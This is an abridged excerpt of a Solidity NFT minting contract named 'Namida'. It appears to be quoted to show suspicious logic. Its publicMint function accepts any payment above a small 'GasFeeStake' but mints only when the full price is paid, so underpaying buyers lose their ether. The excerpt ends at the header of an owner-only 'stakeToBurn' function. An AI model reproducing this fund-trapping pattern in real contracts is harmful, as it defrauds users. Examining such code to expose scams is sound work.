...
contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
     ...
     */
     uint256 constant _magic_n = 1517;
...
contract Namida  is ERC721A, Ownable {
    ...
    string  public uriPrefix = "ipfs://QmQmEbdVUBvnRPHf8Xqdh4crVf9bez6dDjzCEyS8d57SmB/";

    uint256 public immutable cost = 0.007 ether;
    uint256 public immutable GasFeeStake = 0.003 ether;
    uint32 public immutable maxSupply = 1600;
    ...
    function publicMint (uint256 amount) public payable callerIsUser{
        ...
        require(msg.value >= GasFeeStake, "insufficient");
        if (msg.value >= cost * amount) {
            _safeMint(msg.sender, amount);
        }
    }

    function stakeToBurn (uint256 amount) public onlyOwner {
